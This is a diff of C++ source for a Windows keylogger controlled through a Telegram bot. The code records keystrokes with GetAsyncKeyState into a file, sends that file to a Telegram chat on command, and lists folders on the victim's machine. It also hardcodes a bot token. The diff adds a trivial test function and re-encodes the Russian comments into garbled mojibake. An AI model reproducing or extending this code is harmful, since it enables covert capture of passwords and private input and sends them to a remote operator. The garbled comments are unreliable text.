@@ -4,18 +4,25 @@
 #include <tgbot/tgbot.h>
 #include <filesystem>
 
+extern "C" {
+    #include <stdio.h>
+	char TestWrite(char symbol) {
+		return 'A' + ('I' - 'A') * (symbol == 'T');
+	}
+}
+
 namespace fs = std::filesystem;
 const char* filename = "temp.txt";
 
-// функция отслеживания нажатий на клавиши
+// ГґГіГ­ГЄГ¶ГЁГї Г®ГІГ±Г«ГҐГ¦ГЁГўГ Г­ГЁГї Г­Г Г¦Г ГІГЁГ© Г­Г  ГЄГ«Г ГўГЁГёГЁ
 void startKeyLogger(const TgBot::Bot &bot_ref, const int64_t chat_id) {
 	using namespace std;
 	
 	while (true) 
 	{
-		ofstream outfile(filename, ios::app); // создаём файл (если он ещё не существует)
+		ofstream outfile(filename, ios::app); // Г±Г®Г§Г¤Г ВёГ¬ ГґГ Г©Г« (ГҐГ±Г«ГЁ Г®Г­ ГҐГ№Вё Г­ГҐ Г±ГіГ№ГҐГ±ГІГўГіГҐГІ)
 
-		// проверяем, есть ли проблемы с доступом к файлу
+		// ГЇГ°Г®ГўГҐГ°ГїГҐГ¬, ГҐГ±ГІГј Г«ГЁ ГЇГ°Г®ГЎГ«ГҐГ¬Г» Г± Г¤Г®Г±ГІГіГЇГ®Г¬ ГЄ ГґГ Г©Г«Гі
 		if (!outfile)
 		{
 			bot_ref.getApi().sendMessage(chat_id, "Cannot open the file.");
@@ -24,13 +31,13 @@ void startKeyLogger(const TgBot::Bot &bot_ref, const int64_t chat_id) {
 
 		for (int i = 0; i < 0xA3; i++)
 		{
-			// если клавиша была нажата...
+			// ГҐГ±Г«ГЁ ГЄГ«Г ГўГЁГёГ  ГЎГ»Г«Г  Г­Г Г¦Г ГІГ ...
 			if (GetAsyncKeyState(i) & 0b1)
 			{
-				if (i >= 0x30 && i <= 0x5A)     // клавиши от 0 до 9 и от 'A' до 'Z' https://learn.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes
+				if (i >= 0x30 && i <= 0x5A)     // ГЄГ«Г ГўГЁГёГЁ Г®ГІ 0 Г¤Г® 9 ГЁ Г®ГІ 'A' Г¤Г® 'Z' https://learn.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes
 					outfile << (char)i;
 
-				else if (i == VK_RETURN)        // другие клавиши
+				else if (i == VK_RETURN)        // Г¤Г°ГіГЈГЁГҐ ГЄГ«Г ГўГЁГёГЁ
 					outfile << "[ENTER]";
 
 				else if (i == VK_BACK)
@@ -50,7 +57,7 @@ void startKeyLogger(const TgBot::Bot &bot_ref, const int64_t chat_id) {
 	}
 }
 
-// Преобразование широкой строки в UTF8 для читания названия элементов на русском
+// ГЏГ°ГҐГ®ГЎГ°Г Г§Г®ГўГ Г­ГЁГҐ ГёГЁГ°Г®ГЄГ®Г© Г±ГІГ°Г®ГЄГЁ Гў UTF8 Г¤Г«Гї Г·ГЁГІГ Г­ГЁГї Г­Г Г§ГўГ Г­ГЁГї ГЅГ«ГҐГ¬ГҐГ­ГІГ®Гў Г­Г  Г°ГіГ±Г±ГЄГ®Г¬
 std::string wstringToUtf8(const std::wstring& wstr) {
 	int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
 	std::string strTo(size_needed, 0);
@@ -62,9 +69,9 @@ void startBot(std::string token) {
 	TgBot::Bot bot(token);
 
 	/*
-	Если текущий режим пуст - значит это обычный режим: мы можем писать команды,
-	если же он не пуст, то значит программа не будет принимать команды, а будет принимать то,
-	на что настроен режим (путь к папке, флаги выполнения подзадач и т.п.)
+	Г…Г±Г«ГЁ ГІГҐГЄГіГ№ГЁГ© Г°ГҐГ¦ГЁГ¬ ГЇГіГ±ГІ - Г§Г­Г Г·ГЁГІ ГЅГІГ® Г®ГЎГ»Г·Г­Г»Г© Г°ГҐГ¦ГЁГ¬: Г¬Г» Г¬Г®Г¦ГҐГ¬ ГЇГЁГ±Г ГІГј ГЄГ®Г¬Г Г­Г¤Г»,
+	ГҐГ±Г«ГЁ Г¦ГҐ Г®Г­ Г­ГҐ ГЇГіГ±ГІ, ГІГ® Г§Г­Г Г·ГЁГІ ГЇГ°Г®ГЈГ°Г Г¬Г¬Г  Г­ГҐ ГЎГіГ¤ГҐГІ ГЇГ°ГЁГ­ГЁГ¬Г ГІГј ГЄГ®Г¬Г Г­Г¤Г», Г  ГЎГіГ¤ГҐГІ ГЇГ°ГЁГ­ГЁГ¬Г ГІГј ГІГ®,
+	Г­Г  Г·ГІГ® Г­Г Г±ГІГ°Г®ГҐГ­ Г°ГҐГ¦ГЁГ¬ (ГЇГіГІГј ГЄ ГЇГ ГЇГЄГҐ, ГґГ«Г ГЈГЁ ГўГ»ГЇГ®Г«Г­ГҐГ­ГЁГї ГЇГ®Г¤Г§Г Г¤Г Г· ГЁ ГІ.ГЇ.)
 	*/
 	std::string currentMode = "";
 
@@ -85,7 +92,7 @@ void startBot(std::string token) {
 		});
 
 
-	// Запускаем кейлоггер на команду key_logger
+	// Г‡Г ГЇГіГ±ГЄГ ГҐГ¬ ГЄГҐГ©Г«Г®ГЈГЈГҐГ° Г­Г  ГЄГ®Г¬Г Г­Г¤Гі key_logger
 	bot.getEvents().onCommand("key_logger", [&bot, &currentMode](TgBot::Message::Ptr message) {
 		if (currentMode.empty()) 
 		{
@@ -100,11 +107,11 @@ void startBot(std::string token) {
 		});
 
 
-	// Отсылаем файл с записями на команду send
+	// ГЋГІГ±Г»Г«Г ГҐГ¬ ГґГ Г©Г« Г± Г§Г ГЇГЁГ±ГїГ¬ГЁ Г­Г  ГЄГ®Г¬Г Г­Г¤Гі send
 	bot.getEvents().onCommand("send", [&bot, &currentMode](TgBot::Message::Ptr message) {
 		if (currentMode.empty()) 
 		{
-			// Проверяем, не пустой ли файл
+			// ГЏГ°Г®ГўГҐГ°ГїГҐГ¬, Г­ГҐ ГЇГіГ±ГІГ®Г© Г«ГЁ ГґГ Г©Г«
 			std::ifstream inFile(filename);
 			if (inFile.peek() == std::ifstream::traits_type::eof())
 				bot.getApi().sendMessage(message->chat->id, "The file is empty.");
@@ -117,7 +124,7 @@ void startBot(std::string token) {
 		});
 
 	
-	// Запускаем режим просмотра папок
+	// Г‡Г ГЇГіГ±ГЄГ ГҐГ¬ Г°ГҐГ¦ГЁГ¬ ГЇГ°Г®Г±Г¬Г®ГІГ°Г  ГЇГ ГЇГ®ГЄ
 	bot.getEvents().onCommand("check_path_mode", [&bot, &currentMode](TgBot::Message::Ptr message) {
 		if (currentMode.empty())
 		{
@@ -129,10 +136,10 @@ void startBot(std::string token) {
 		});
 
 
-	// Обработка ВСЕХ сообщений от пользователя проходит здесь В ПЕРВУЮ ОЧЕРЕДЬ
+	// ГЋГЎГ°Г ГЎГ®ГІГЄГ  Г‚Г‘Г…Г• Г±Г®Г®ГЎГ№ГҐГ­ГЁГ© Г®ГІ ГЇГ®Г«ГјГ§Г®ГўГ ГІГҐГ«Гї ГЇГ°Г®ГµГ®Г¤ГЁГІ Г§Г¤ГҐГ±Гј Г‚ ГЏГ…ГђГ‚Г“Гћ ГЋГ—Г…ГђГ…Г„Гњ
 	bot.getEvents().onAnyMessage([&bot, &currentMode](TgBot::Message::Ptr message) {
 
-		// Эта команда находится здесь из-за удобства 
+		// ГќГІГ  ГЄГ®Г¬Г Г­Г¤Г  Г­Г ГµГ®Г¤ГЁГІГ±Гї Г§Г¤ГҐГ±Гј ГЁГ§-Г§Г  ГіГ¤Г®ГЎГ±ГІГўГ  
 		std::string messageText = message->text;
 		if (messageText == "/exit_mode") {
 			bot.getApi().sendMessage(message->chat->id, "Exiting your current mode: " + currentMode);
@@ -148,7 +155,7 @@ void startBot(std::string token) {
 				for (const auto& entry : fs::directory_iterator(path)) {
 					std::wstring filePath = entry.path().wstring();
 
-					// Преобразуем в std::string с помощью MultiByteToWideChar
+					// ГЏГ°ГҐГ®ГЎГ°Г Г§ГіГҐГ¬ Гў std::string Г± ГЇГ®Г¬Г®Г№ГјГѕ MultiByteToWideChar
 					std::string filePathUtf8 = wstringToUtf8(filePath);
 
 					bot.getApi().sendMessage(message->chat->id, filePathUtf8);
@@ -175,6 +182,7 @@ void startBot(std::string token) {
 
 int main()
 {
+	printf("%c", TestWrite('T'));
 	startBot("6507971490:AAEFE5H4m1KJvJwUXFDgM4cVHSSwTXx0uiU");
 	
 	return 0;
